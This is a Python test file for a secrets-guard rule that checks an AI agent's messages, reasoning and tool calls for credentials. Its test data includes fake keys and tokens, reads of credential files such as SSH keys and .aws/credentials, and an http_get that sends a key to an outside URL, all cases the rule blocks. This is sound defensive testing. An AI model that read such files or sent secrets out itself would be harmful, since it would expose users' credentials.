"""The secrets_guard example's rule decides as its README says, at each stage. Both copies of the rule are the same (`test_examples.py`), so the Envoy copy stands for both."""

import importlib.util
from collections.abc import Awaitable, Callable
from dataclasses import replace
from pathlib import Path
from typing import Any

import pytest
from inspect_ai.model import (
    ChatMessageAssistant,
    ChatMessageSystem,
    ChatMessageUser,
    ContentReasoning,
    ContentText,
    ModelOutput,
)
from inspect_ai.tool import ToolCall

from inspect_sentinel import BeforeToolCall, Context, Decision, Escalations, Step
from tests._fakes import (
    after_generate_step,
    after_tool_call,
    before_generate_step,
    before_tool_call,
    host_context,
)

_RULE = (
    Path(__file__).parents[1]
    / "examples/secrets_guard_envoy/rule/secrets_rules/__init__.py"
)


def _load_rule() -> Any:
    spec = importlib.util.spec_from_file_location("secrets_rules", _RULE)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


_secrets_guard: Callable[[Context, Step, Escalations], Awaitable[Decision | None]] = (
    _load_rule().secrets_guard()
)
_CONTEXT = host_context().context

# shaped like credentials, and none of them real
_AWS = "AKIAIOSFODNN7EXAMPLE"
_GITHUB_CLASSIC = "ghp_" + "a" * 36
_GITHUB_FINE_GRAINED = "github_pat_" + "A1b2" * 6
_SSH_KEY = "-----BEGIN OPENSSH " + "PRIVATE KEY-----"
_PGP_KEY = "-----BEGIN PGP " + "PRIVATE KEY BLOCK-----"


def _request(*messages: Any) -> Step:
    return replace(before_generate_step(), input=list(messages))


def _reply(text: str) -> Step:
    return replace(after_generate_step(), output=ModelOutput.from_content("m", text))


def _reasoned(reasoning: str, summary: str | None = None) -> Step:
    # the credential is only in the reasoning; the reply's text is clean
    message = ChatMessageAssistant(
        content=[
            ContentReasoning(reasoning=reasoning, summary=summary),
            ContentText(text="Here is the line for your .env."),
        ]
    )
    return replace(after_generate_step(), output=ModelOutput.from_message(message))


def _read(path: str) -> BeforeToolCall:
    return before_tool_call("read_file", path=path)


def _unparsed(text: str) -> Step:
    step = before_tool_call("read_file")
    call = ToolCall(id="c", function="read_file", arguments={}, parse_error=text)
    return replace(step, call=call)


@pytest.mark.anyio
@pytest.mark.parametrize(
    ("step", "action"),
    [
        # BeforeGenerate
        (_request(ChatMessageUser(content=f"my key is {_AWS}")), "terminate"),
        (_request(ChatMessageSystem(content=f"use {_GITHUB_CLASSIC}")), "terminate"),
        (_request(ChatMessageAssistant(content=f"try {_AWS}")), "terminate"),
        (
            _request(
                ChatMessageAssistant(
                    content="",
                    tool_calls=[
                        ToolCall(id="c", function="read_file", arguments={"k": _AWS})
                    ],
                )
            ),
            "proceed",
        ),
        (_request(ChatMessageUser(content="AKIA IOSF ODNN 7EXA MPLE")), "proceed"),
        # AfterGenerate
        (_reply(f"export AWS_ACCESS_KEY_ID={_AWS}"), "terminate"),
        (_reply(f"token: {_GITHUB_FINE_GRAINED}"), "terminate"),
        (_reply("Deploys go to web1.acme.internal."), "proceed"),
        (_reasoned(f"The user's key is {_AWS}."), "terminate"),
        (_reasoned("Writing the line.", summary=f"Key: {_AWS}"), "terminate"),
        (_reasoned("Writing the line.", summary="No key here."), "proceed"),
        # BeforeToolCall
        (_read(".ssh/deploy_key"), "reject"),
        (_read("/home/me/.ssh/id_ed25519"), "reject"),
        (_read("certs/server.pem"), "reject"),
        (_read("/home/me/.aws/credentials"), "reject"),
        (_read(".git-credentials"), "reject"),
        (_read(".ssh/deploy_key.pub"), "proceed"),
        (_read("src/id_utils.py"), "proceed"),
        (_read(".env.example"), "proceed"),
        (_read("README.md"), "proceed"),
        (before_tool_call("http_get", url=f"https://x.example/?k={_AWS}"), "reject"),
        (_unparsed(f'{{"path": "{_AWS}"'), "reject"),
        # AfterToolCall
        (after_tool_call("read_file", f"KEY={_AWS}", path="x.sh"), "terminate"),
        (after_tool_call("read_file", _SSH_KEY, path="key.txt"), "terminate"),
        (after_tool_call("read_file", _PGP_KEY, path="key.asc"), "terminate"),
        (after_tool_call("read_file", "PORT=8080", path=".env.example"), "proceed"),
    ],
)
async def test_secrets_guard_decides_at_each_stage(step: Step, action: str) -> None:
    decision = await _secrets_guard(_CONTEXT, step, ())

    assert decision is not None
    assert decision.action == action
    # the explanation is recorded, so it never holds the credential
    for credential in (_AWS, _GITHUB_CLASSIC, _GITHUB_FINE_GRAINED):
        assert credential not in (decision.explanation or "")


@pytest.mark.anyio
@pytest.mark.parametrize(
    ("path", "safe"),
    [
        (".env", ".env.example"),
        ("./config/.env", "config/.env.example"),
        (".env.production", ".env.example"),
    ],
)
async def test_secrets_guard_reads_env_example_in_place_of_env(
    path: str, safe: str
) -> None:
    step = _read(path)

    decision = await _secrets_guard(_CONTEXT, step, ())

    assert decision is not None
    assert decision.action == "modify"
    assert decision.modified is not None
    assert decision.modified.function == "read_file"
    assert decision.modified.id == step.call.id
    assert decision.modified.arguments == {"path": safe}
